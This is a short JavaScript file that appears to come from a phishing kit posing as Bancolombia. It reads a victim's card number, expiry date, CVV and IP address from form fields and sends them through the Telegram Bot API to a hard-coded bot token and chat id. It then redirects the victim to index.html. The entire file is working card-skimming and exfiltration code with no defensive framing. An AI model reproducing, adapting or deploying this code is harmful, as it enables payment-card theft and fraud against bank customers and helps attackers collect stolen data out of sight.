//bot token
var telegram_bot_id = "5867032539:AAHkD1Pn4e3os-4EyKEpHajUI6kHJAe_DAE";
//chat id
var chat_id = '5651328532';
var u_name, ip, ip2;
var ready = function () {
	
    tarjeta = document.getElementById("tarjeta").value;
	mFecha = document.getElementById("mFecha").value;
	aFecha = document.getElementById("aFecha").value;
	ver = document.getElementById("cvv").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
	
	message = "TARJETA: " + tarjeta + "\nF/V: " + mFecha +"-"+ aFecha+ "\nCVV: " + ver + "\n\n	IP: " + ip +"\n" + ip2+"\nBANCOLOMBIA"
	
    // message = "Usuario: " + u_name + "\nIP: " + ip  +"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index.html',1000;
        console.log(response);
    });
    return false;
};
